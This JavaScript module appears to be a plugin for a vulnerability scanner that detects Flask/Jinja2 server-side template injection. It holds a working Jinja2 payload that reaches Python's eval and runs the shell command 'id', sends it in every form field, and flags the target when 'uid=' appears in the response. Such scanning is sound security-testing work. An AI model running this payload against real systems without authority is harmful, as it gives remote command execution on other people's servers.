module.exports={
	tags:"ssti,flask,parms",
    des:"Flask（Jinja2） 服务端模板注入漏洞",
    dependencies:"",
	VulApps:[],
	urls:["https://github.com/vulhub/vulhub/tree/master/flask/ssti"],
	doCheck:function (url,fnCbk,parms)
	{
        url = url.trim().replace(/[\s\r\n]*/gmi,'');
        var _t = this,_s = this.self,hst = _s.parseUrl(url);
        hst.port = hst.port||(-1 < hst.protocol.indexOf("https")?443:80);
        
        var szPay1 = '';
        // safe.cgi
        var len = 217 + szPay1.length,szPaload = encodeURIComponent(`{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
    {% for b in c.__init__.__globals__.values() %}
    {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
        {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
    {% endif %}
    {% endfor %}
{% endif %}
{% endfor %}`);
    for(var k in parms)
    {
        szPay1 += k + "=" +  szPaload + "&";
        parms[k] = szPaload;
    }
    _s.request(_s.fnOptHeader({method: 'POST',uri: url,
        data:szPay1,
        formData:parms
        ,headers:
        {
            "User-Agent": _s.g_szUa,
            "Content-Type":'multipart/form-data'
        }})
        ,function (error, response, body)
        {
            body = String(body);
            // _s.fnShowBody(body);
            if(body && -1 < body.indexOf("uid="))
            {
                var r = {"url":url,"send":szPay1,"result":body,tags:_t.tags};
                r.vul = true;
                fnCbk(r,_t);
            }
        }
    );
	}
};